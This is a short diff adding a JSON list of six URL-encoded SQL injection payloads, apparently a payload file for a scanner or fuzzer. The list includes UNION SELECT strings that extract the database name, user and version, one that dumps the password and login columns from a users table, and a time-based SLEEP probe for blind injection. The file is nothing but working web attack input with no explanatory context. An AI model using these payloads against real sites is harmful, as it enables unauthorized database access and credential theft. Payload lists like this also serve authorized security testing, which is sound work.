@@ -1,0 +1,8 @@
+[
+	"%27+and+1=2+union+select+1,2,database%28%29,user%28%29,5,6,version%28%29,8,9,10,11,12+--+%20%3E%3E%2",
+	"%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+",
+	"%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29+--+",
+	"%20UNION%20ALL%20SELECT%201,2,3,password,5,6,login,8,9,10,11,12%20FROM%20users%20+--+",
+	"%27+and+1=2+union+select+1,2,3+--+",
+	"+and+SLEEP%2810%29+--+"
+]
